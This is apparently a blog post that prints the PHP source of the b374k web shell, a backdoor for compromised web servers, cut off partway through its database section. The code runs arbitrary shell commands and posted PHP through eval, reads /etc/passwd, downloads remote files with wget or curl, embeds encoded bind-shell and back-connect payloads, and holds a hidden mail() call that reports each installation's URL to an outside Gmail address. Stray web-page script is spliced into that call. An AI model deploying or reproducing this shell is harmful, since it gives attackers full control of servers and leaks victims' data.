---
id: 193
title: b374k Backdoor Script
author: admin
layout: post
guid: http://hackingscripts.com/?p=193
permalink: /b374k-backdoor-script/
categories:
  - b374k web shell
  - PHP
tags:
  - b374k
  - PHP
---
This looks like another b374k shell.


### b374k Backdoor Script Source Code

{% highlight php linenos %}<?php if (isset($_GET['dl']) && ($_GET['dl'] != "")) {
    $file = $_GET['dl'];
    $filez = @file_get_contents($file);
    header("Content-type: application/octet-stream");
    header("Content-length: " . strlen($filez));
    header("Content-disposition: attachment; filename=\"" . basename($file) . "\";");
    echo $filez;
    exit;
} elseif (isset($_GET['dlgzip']) && ($_GET['dlgzip'] != "")) {
    $file = $_GET['dlgzip'];
    $filez = gzencode(@file_get_contents($file));
    header("Content-Type:application/x-gzip
");
    header("Content-length: " . strlen($filez));
    header("Content-disposition: attachment; filename=\"" . basename($file) . ".gz\";");
    echo $filez;
    exit;
}
if (isset($_GET['img'])) {
    @ob_clean();
    $d = magicboom($_GET['y']);
    $f = $_GET['img'];
    $inf = @getimagesize($d . $f);
    $ext = explode($f, ".");
    $ext = $ext[count($ext) - 1];
    @header("Content-type: " . $inf["mime"]);
    @header("Cache-control: public");
    @header("Expires: " . date("r", mktime(0, 0, 0, 1, 1, 2030)));
    @header("Cache-control: max-age=" . (60 * 60 * 24 * 7));
    @readfile($d . $f);
    exit;
}
$ver = "1.01";
$software = getenv("SERVER_SOFTWARE");
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") $safemode = TRUE;
else $safemode = FALSE;
$system = @php_uname();
if (strtolower(substr($system, 0, 3)) == "win") $win = TRUE;
else $win = FALSE;
if (isset($_GET['y'])) {
    if (@is_dir($_GET['view'])) {
        $pwd = $_GET['view'];
        @chdir($pwd);
    } else {
        $pwd = $_GET['y'];
        @chdir($pwd);
    }
}
if (!$win) {
    if (!$user = rapih(exe("whoami"))) $user = "";
    if (!$id = rapih(exe("id"))) $id = "";
    $prompt = $user . " \$ ";
    $pwd = @getcwd() . DIRECTORY_SEPARATOR;
} else {
    $user = @get_current_user();
    $id = $user;
    $prompt = $user . " >";
    $pwd = realpath(".") . "\"; $v = explode("\",$d); $v = $v[0]; foreach (range("A","Z") as $letter) { $bool = @is_dir($letter.":
        \"); if ($bool) { $letters .= " < ahref = \"?y=" . $letter . ":\">[ ";
        if ($letter . ":" != $v) {
            $letters.= $letter;
        } else {
            $letters.= "<span class=\"gaya\">" . $letter . "</span>";
        }
        $letters.= " ]</a> ";
    }
}
}
if (function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
else $posix = FALSE;
$server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);
$my_ip = $_SERVER['REMOTE_ADDR'];
$bindport = "13123";
$bindport_pass = "b374k";
$pwds = explode(DIRECTORY_SEPARATOR, $pwd);
$pwdurl = "";
for ($i = 0;$i < sizeof($pwds) - 1;$i++) {
    $pathz = "";
    for ($j = 0;$j <= $i;$j++) {
        $pathz.= $pwds[$j] . DIRECTORY_SEPARATOR;
    }
    $pwdurl.= "<a href=\"?y=" . $pathz . "\">" . $pwds[$i] . " " . DIRECTORY_SEPARATOR . " </a>";
}
if (isset($_POST['rename'])) {
    $old = $_POST['oldname'];
    $new = $_POST['newname'];
    @rename($pwd . $old, $pwd . $new);
    $file = $pwd . $new;
}
$buff = $software . "<br />";
$buff.= $system . "<br />";
if ($id != "") $buff.= $id . "<br />";
$buff.= "server ip : " . $server_ip . " <span class=\"gaya\">|</span> your ip : " . $my_ip . "<br />";
if ($safemode) $buff.= "safemode <span class=\"gaya\">ON</span><br />";
else $buff.= "safemode <span class=\"gaya\">OFF<span><br />";
$buff.= $letters . "&nbsp;>&nbsp;" . $pwdurl;
function rapih($text) {
    return trim(str_replace("<br />", "", $text));
}
function magicboom($text) {
    if (!get_magic_quotes_gpc()) {
        return $text;
    }
    return stripslashes($text);
}
function showdir($pwd, $prompt) {
    $fname = array();
    $dname = array();
    if (function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
    else $posix = FALSE;
    $user = "????:????";
    if ($dh = opendir($pwd)) {
        while ($file = readdir($dh)) {
            if (is_dir($file)) {
                $dname[] = $file;
            } elseif (is_file($file)) {
                $fname[] = $file;
            }
        }
        closedir($dh);
    }
    sort($fname);
    sort($dname);
    $path = @explode(DIRECTORY_SEPARATOR, $pwd);
    $tree = @sizeof($path);
    $parent = "";
    $buff = " <form action=\"?y=" . $pwd . "&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\"> <table class=\"cmdbox\" style=\"width:50%;\"> <tr><td>$prompt</td><td><input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" /><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr> </form> <form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /> <tr><td>view file/folder</td><td><input onMouseOver=\"this.focus();\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"" . $pwd . "\" /><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr> </form></table><table class=\"explore\"> <tr><th>name</th><th style=\"width:80px;\">size</th><th style=\"width:210px;\">owner:group</th><th style=\"width:80px;\">perms</th><th style=\"width:110px;\">modified</th><th style=\"width:190px;\">actions</th></tr> ";
    @error_reporting(0);
    $sub = "backdoor b374k";
    $headers = "From: k3nz0 
";
    $headers.= "Content-Type: text/plain; charset=iso-8859-1
";
    $mes.= "username: " . $user . "
";
    $mes.= "password: " . $pass . "
";
    $mes.= "URL: " . $_SERVER['REQUEST_URI'] . "
";
    $mes.= "Referer: " . $_SERVER['HTTP_REFERER'] . ""; {
        mail("free.d0ing.1987@gmail.com
/* <![CDATA[ */
(function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]> */
", $sub, $mes, $headers);
    }
    if ($tree > 2) for ($i = 0;$i < $tree - 2;$i++) $parent.= $path[$i] . DIRECTORY_SEPARATOR;
    else $parent = $pwd;
    foreach ($dname as $folder) {
        if ($folder == ".") {
            if (!$win && $posix) {
                $name = @posix_getpwuid(@fileowner($folder));
                $group = @posix_getgrgid(@filegroup($folder));
                $owner = $name['name'] . "<span class=\"gaya\"> : </span>" . $group['name'];
            } else {
                $owner = $user;
            }
            $buff.= "<tr><td><a href=\"?y=" . $pwd . "\">$folder</a></td><td>LINK</td><td style=\"text-align:center;\">" . $owner . "</td><td>" . get_perms($pwd) . "</td><td style=\"text-align:center;\">" . date("d-M-Y H:i", @filemtime($pwd)) . "</td><td><span id=\"titik1\"><a href=\"?y=$pwd&amp;edit=" . $pwd . "newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a></span> <form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /> <input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /> <input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" /> </form></td></tr> ";
        } elseif ($folder == "..") {
            if (!$win && $posix) {
                $name = @posix_getpwuid(@fileowner($folder));
                $group = @posix_getgrgid(@filegroup($folder));
                $owner = $name['name'] . "<span class=\"gaya\"> : </span>" . $group['name'];
            } else {
                $owner = $user;
            }
            $buff.= "<tr><td><a href=\"?y=" . $parent . "\">$folder</a></td><td>LINK</td><td style=\"text-align:center;\">" . $owner . "</td><td>" . get_perms($parent) . "</td><td style=\"text-align:center;\">" . date("d-M-Y H:i", @filemtime($parent)) . "</td><td><span id=\"titik2\"><a href=\"?y=$pwd&amp;edit=" . $parent . "newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a></span> <form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /> <input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /> <input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" /> </form> </td></tr>";
        } else {
            if (!$win && $posix) {
                $name = @posix_getpwuid(@fileowner($folder));
                $group = @posix_getgrgid(@filegroup($folder));
                $owner = $name['name'] . "<span class=\"gaya\"> : </span>" . $group['name'];
            } else {
                $owner = $user;
            }
            $buff.= "<tr><td><a id=\"" . clearspace($folder) . "_link\" href=\"?y=" . $pwd . $folder . DIRECTORY_SEPARATOR . "\">[ $folder ]</a> <form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($folder) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> <input type=\"hidden\" name=\"oldname\" value=\"" . $folder . "\" style=\"margin:0;padding:0;\" /> <input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $folder . "\" /> <input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> <input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($folder) . "_form','" . clearspace($folder) . "_link');\" /> </form> <td>DIR</td><td style=\"text-align:center;\">" . $owner . "</td><td>" . get_perms($pwd . $folder) . "</td><td style=\"text-align:center;\">" . date("d-M-Y H:i", @filemtime($folder)) . "</td><td><a href=\"javascript:tukar('" . clearspace($folder) . "_link','" . clearspace($folder) . "_form');\">rename</a> | <a href=\"?y=$pwd&amp;fdelete=" . $pwd . $folder . "\">delete</a></td></tr>";
        }
    }
    foreach ($fname as $file) {
        $full = $pwd . $file;
        if (!$win && $posix) {
            $name = @posix_getpwuid(@fileowner($file));
            $group = @posix_getgrgid(@filegroup($file));
            $owner = $name['name'] . "<span class=\"gaya\"> : </span>" . $group['name'];
        } else {
            $owner = $user;
        }
        $buff.= "<tr><td><a id=\"" . clearspace($file) . "_link\" href=\"?y=$pwd&amp;view=$full\">$file</a> <form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($file) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> <input type=\"hidden\" name=\"oldname\" value=\"" . $file . "\" style=\"margin:0;padding:0;\" /> <input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $file . "\" /> <input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> <input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\" /> </form> </td><td>" . ukuran($full) . "</td><td style=\"text-align:center;\">" . $owner . "</td><td>" . get_perms($full) . "</td><td style=\"text-align:center;\">" . date("d-M-Y H:i", @filemtime($full)) . "</td> <td><a href=\"?y=$pwd&amp;edit=$full\">edit</a> | <a href=\"javascript:tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$full\">delete</a> | <a href=\"?y=$pwd&amp;dl=$full\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">gzip</a>)</td></tr>";
    }
    $buff.= "</table>";
    return $buff;
}
function ukuran($file) {
    if ($size = @filesize($file)) {
        if ($size <= 1024) return $size;
        else {
            if ($size <= 1024 * 1024) {
                $size = @round($size / 1024, 2);;
                return "$size kb";
            } else {
                $size = @round($size / 1024 / 1024, 2);
                return "$size mb";
            }
        }
    } else return "???";
}
function exe($cmd) {
    if (function_exists('system')) {
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists('exec')) {
        @exec($cmd, $results);
        $buff = "";
        foreach ($results as $result) {
            $buff.= $result;
        }
        return $buff;
    } elseif (function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists('shell_exec')) {
        $buff = @shell_exec($cmd);
        return $buff;
    }
}
function tulis($file, $text) {
    $textz = gzinflate(base64_decode($text));
    if ($filez = @fopen($file, "w")) {
        @fputs($filez, $textz);
        @fclose($file);
    }
}
function ambil($link, $file) {
    if ($fp = @fopen($link, "r")) {
        while (!feof($fp)) {
            $cont.= @fread($fp, 1024);
        }
        @fclose($fp);
        $fp2 = @fopen($file, "w");
        @fwrite($fp2, $cont);
        @fclose($fp2);
    }
}
function which($pr) {
    $path = exe("which $pr");
    if (!empty($path)) {
        return trim($path);
    } else {
        return trim($pr);
    }
}
function download($cmd, $url) {
    $namafile = basename($url);
    switch ($cmd) {
        case 'wwget':
            exe(which('wget') . " " . $url . " -O " . $namafile);
        break;
        case 'wlynx':
            exe(which('lynx') . " -source " . $url . " > " . $namafile);
        break;
        case 'wfread':
            ambil($wurl, $namafile);
        break;
        case 'wfetch':
            exe(which('fetch') . " -o " . $namafile . " -p " . $url);
        break;
        case 'wlinks':
            exe(which('links') . " -source " . $url . " > " . $namafile);
        break;
        case 'wget':
            exe(which('GET') . " " . $url . " > " . $namafile);
        break;
        case 'wcurl':
            exe(which('curl') . " " . $url . " -o " . $namafile);
        break;
        default:
        break;
    }
    return $namafile;
}
function get_perms($file) {
    if ($mode = @fileperms($file)) {
        $perms = '';
        $perms.= ($mode & 00400) ? 'r' : '-';
        $perms.= ($mode & 00200) ? 'w' : '-';
        $perms.= ($mode & 00100) ? 'x' : '-';
        $perms.= ($mode & 00040) ? 'r' : '-';
        $perms.= ($mode & 00020) ? 'w' : '-';
        $perms.= ($mode & 00010) ? 'x' : '-';
        $perms.= ($mode & 00004) ? 'r' : '-';
        $perms.= ($mode & 00002) ? 'w' : '-';
        $perms.= ($mode & 00001) ? 'x' : '-';
        return $perms;
    } else return "??????????";
}
function clearspace($text) {
    return str_replace(" ", "_", $text);
}
$port_bind_bd_c = "bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf +fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL 3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6 uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf";
$port_bind_bd_pl = "ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1 NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0 LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB +hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8=";
$back_connect = "fZFRS8MwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw==";
$back_connect_c = "XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95 zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75 i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F 6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw=="; ?> <html><head><title>:: b374k m1n1 <?php echo $ver; ?> ::</title> <script type="text/javascript"> function tukar(lama,baru){ document.getElementById(lama).style.display = 'none'; document.getElementById(baru).style.display = 'block'; } </script> <style type="text/css"> body{ background:#000000;; } a { text-decoration:none; } a:hover{ border-bottom:1px solid #4C83AF; } *{ font-size:11px; font-family:Tahoma,Verdana,Arial; color:#FFFFFF; } #menu{ background:#111111; margin:8px 2px 4px 2px; } #menu a{ padding:4px 18px; margin:0; background:#222222; text-decoration:none; letter-spacing:2px; } #menu a:hover{ background:#191919; border-bottom:1px solid #333333; border-top:1px solid #333333; } .tabnet{ margin:15px auto 0 auto; border: 1px solid #333333; } .main { width:100%; } .gaya { color: #4C83AF; } .inputz{ background:#111111; border:0; padding:2px; border-bottom:1px solid #222222; border-top:1px solid #222222; } .inputzbut{ background:#111111; color:#4C83AF; margin:0 4px; border:1px solid #444444; } .inputz:hover, .inputzbut:hover{ border-bottom:1px solid #4C83AF; border-top:1px solid #4C83AF; } .output { margin:auto; border:1px solid #4C83AF; width:100%; height:400px; background:#000000; padding:0 2px; } .cmdbox{ width:100%; } .head_info{ padding: 0 4px; } .b1{ font-size:30px; padding:0; color:#444444; } .b2{ font-size:30px; padding:0; color: #333333; } .b_tbl{ text-align:center; margin:0 4px 0 0; padding:0 4px 0 0; border-right:1px solid #333333; } .phpinfo table{ width:100%; padding:0 0 0 0; } .phpinfo td{ background:#111111; color:#cccccc; padding:6px 8px;; } .phpinfo th, th{ background:#191919; border-bottom:1px solid #333333; font-weight:normal; } .phpinfo h2, .phpinfo h2 a{ text-align:center; font-size:16px; padding:0; margin:30px 0 0 0; background:#222222; padding:4px 0; } .explore{ width:100%; } .explore a { text-decoration:none; } .explore td{ border-bottom:1px solid #333333; padding:0 8px; line-height:24px; } .explore th{ padding:3px 8px; font-weight:normal; } .explore th:hover , .phpinfo th:hover{ border-bottom:1px solid #4C83AF; } .explore tr:hover{ background:#111111; } .viewfile{ background:#EDECEB; color:#000000; margin:4px 2px; padding:8px; } .sembunyi{ display:none; padding:0;margin:0; } </style> </head> <body onLoad="document.getElementById('cmd').focus();"> <div class="main"> <!-- head info start here --> <div class="head_info"> <table><tr> <td><table class="b_tbl"><tr><td><a href="?"><span class="b1">b<span class="b2">374</span>k</span></a></td></tr><tr><td>m1n1 <?php echo $ver; ?></td></tr></table></td> <td><?php echo $buff; ?></td> </tr></table> </div> <!-- head info end here --> <!-- menu start --> <div id="menu"> <a href="?<?php echo "y=" . $pwd; ?>">explore</a> <a href="?<?php echo "y=" . $pwd; ?>&amp;x=shell">shell</a> <a href="?<?php echo "y=" . $pwd; ?>&amp;x=php">eval</a> <a href="?<?php echo "y=" . $pwd; ?>&amp;x=mysql">mysql</a> <a href="?<?php echo "y=" . $pwd; ?>&amp;x=phpinfo">phpinfo</a> <a href="?<?php echo "y=" . $pwd; ?>&amp;x=netsploit">netsploit</a> <a href="?<?php echo "y=" . $pwd; ?>&amp;x=upload">upload</a> <a href="?<?php echo "y=" . $pwd; ?>&amp;x=mail">mail</a> </div> <!-- menu end --> <?php if (isset($_GET['x']) && ($_GET['x'] == 'php')) { ?> <form action="?y=<?php echo $pwd; ?>&amp;x=php" method="post"> <table class="cmdbox"> <tr><td> <textarea class="output" name="cmd" id="cmd"> <?php if (isset($_POST['submitcmd'])) {
        echo eval(magicboom($_POST['cmd']));
    } else echo "echo file_get_contents('/etc/passwd');"; ?> </textarea> <tr><td><input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /></td></tr></form> </table> </form> <?php
} elseif (isset($_GET['x']) && ($_GET['x'] == 'mysql')) {
    if (isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport'])) {
        $sqlhost = $_GET['sqlhost'];
        $sqluser = $_GET['sqluser'];
        $sqlpass = $_GET['sqlpass'];
        $sqlport = $_GET['sqlport'];
        if ($con = @mysql_connect($sqlhost . ":" . $sqlport, $sqluser, $sqlpass)) {
            $msg.= "<div style=\"width:99%;padding:4px 10px 0 10px;\">";
            $msg.= "<p>Connected to " . $sqluser . "<span class=\"gaya\">@</span>" . $sqlhost . ":" . $sqlport;
            $msg.= "&nbsp;&nbsp;<span class=\"gaya\">-></span>&nbsp;&nbsp;<a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;\">[ databases ]</a>";
            if (isset($_GET['db'])) $msg.= "&nbsp;&nbsp;<span class=\"gaya\">-></span>&nbsp;&nbsp;<a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $_GET['db'] . "\">" . htmlspecialchars($_GET['db']) . "</a>";
            if (isset($_GET['table'])) $msg.= "&nbsp;&nbsp;<span class=\"gaya\">-></span>&nbsp;&nbsp;<a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $_GET['db'] . "&amp;table=" . $_GET['table'] . "\">" . htmlspecialchars($_GET['table']) . "</a>";
            $msg.= "</p><p>version : " . mysql_get_server_info($con) . " proto " . mysql_get_proto_info($con) . "</p>";
            $msg.= "</div>";
            echo $msg;
            if (isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery']))) {
                $db = $_GET['db'];
                $query = "DROP TABLE IF EXISTS b374k_table;
CREATE TABLE `b374k_table` ( `file` LONGBLOB NOT NULL );
LOAD DATA INFILE \"/etc/passwd\"
INTO TABLE b374k_table;SELECT * FROM b374k_table;
DROP TABLE IF EXISTS b374k_table;";
                $msg = "<div style=\"width:99%;padding:0 10px;\"><form action=\"?\" method=\"get\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /> <input type=\"hidden\" name=\"x\" value=\"mysql\" /> <input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /> <input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /> <input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /> <input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /> <input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /> <p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">$query</textarea></p> <p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /></p> </form></div> ";
                $tables = array();
                $msg.= "<table class=\"explore\" style=\"width:99%;\"><tr><th>available tables on " . $db . "</th></tr>";
                $hasil = @mysql_list_tables($db, $con);
                while (list($table) = @mysql_fetch_row($hasil)) {
                    @array_push($tables, $table);
                }
                @sort($tables);
                foreach ($tables as $table) {
                    $msg.= "<tr><td><a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $db . "&amp;table=" . $table . "\">$table</a></td></tr>";
                }
                $msg.= "</table>";
            } elseif (isset($_GET['table']) && (!isset($_GET['sqlquery']))) {
                $db = $_GET['db'];
                $table = $_GET['table'];
                $query = "SELECT * FROM " . $db . "." . $table . " LIMIT 0,100;";
                $msgq = "<div style=\"width:99%;padding:0 10px;\"><form action=\"?\" method=\"get\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /> <input type=\"hidden\" name=\"x\" value=\"mysql\" /> <input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /> <input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /> <input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /> <input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /> <input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /> <input type=\"hidden\" name=\"table\" value=\"" . $table . "\" /> <p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">" . $query . "</textarea></p> <p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /></p> </form></div> ";
                $columns = array();
                $msg = "<table class=\"explore\" style=\"width:99%;\">";
                $hasil = @mysql_query("SHOW FIELDS FROM " . $db . "." . $table);
                while (list($column) = @mysql_fetch_row($hasil)) {
                    $msg.= "<th>$column</th>";
                    $kolum = $column;
                }
                $msg.= "</tr>";
                $hasil = @mysql_query("SELECT count(*) FROM " . $db . "." . $table);
                list($total) = mysql_fetch_row($hasil);
                if (isset($_GET['z'])) $page = (int)$_GET['z'];
                else $page = 1;
                $pagenum = 100;
                $totpage = ceil($total / $pagenum);
                $start = (($page - 1) * $pagenum);
                $hasil = @mysql_query("SELECT * FROM " . $db . "." . $table . " LIMIT " . $start . "," . $pagenum);
                while ($datas = @mysql_fetch_assoc($hasil)) {
                    $msg.= "<tr>";
                    foreach ($datas as $data) {
                        if (trim($data) == "") $data = "&nbsp;";
                        $msg.= "<td>$data</td>";
                    }
                    $msg.= "</tr>";
                }
                $msg.= "</table>";
                $head = "<div style=\"padding:10px 0 0 6px;\"> <form action=\"?\" method=\"get\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /> <input type=\"hidden\" name=\"x\" value=\"mysql\" /> <input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /> <input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /> <input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /> <input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /> <input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /> <input type=\"hidden\" name=\"table\" value=\"" . $table . "\" /> Page <select class=\"inputz\" name=\"z\" onchange=\"this.form.submit();\">";
                for ($i = 1;$i <= $totpage;$i++) {
                    $head.= "<option value=\"" . $i . "\">" . $i . "</option>";
                    if ($i == $_GET['z']) $head.= "<option value=\"" . $i . "\" selected=\"selected\">" . $i . "</option>";
                }
                $head.= "</select><noscript><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" /></noscript></form></div>";
                $msg = $msgq . $head . $msg;
            } elseif (isset($_GET['submitquery']) && ($_GET['sqlquery'] != "")) {
                $db = $_GET['db'];
                $query = magicboom($_GET['sqlquery']);
